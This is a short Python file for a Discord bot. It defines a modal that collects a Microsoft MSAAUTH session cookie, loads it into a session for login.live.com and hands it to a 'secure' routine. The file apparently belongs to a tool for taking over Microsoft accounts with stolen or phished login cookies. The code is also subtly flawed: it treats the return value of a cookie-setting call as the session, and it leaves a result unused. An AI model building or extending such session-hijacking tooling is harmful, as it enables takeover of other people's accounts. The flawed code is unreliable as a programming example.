from discord import ui
import discord

from views.utils.initialSession import getSession
from views.utils.securing.secure import secure

class msModal(ui.Modal, title="MSAAUTH Cookie"):
    box_one = ui.TextInput(label="MSAAUTH Cookie", placeholder="Your Cookie here...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        
        await interaction.response.defer()

        session = getSession().cookies.set(
            name = "__Host-MSAAUTH",
            value = self.box_one.value,
            domain = "login.live.com"                
        )

        embeds = secure(session)

    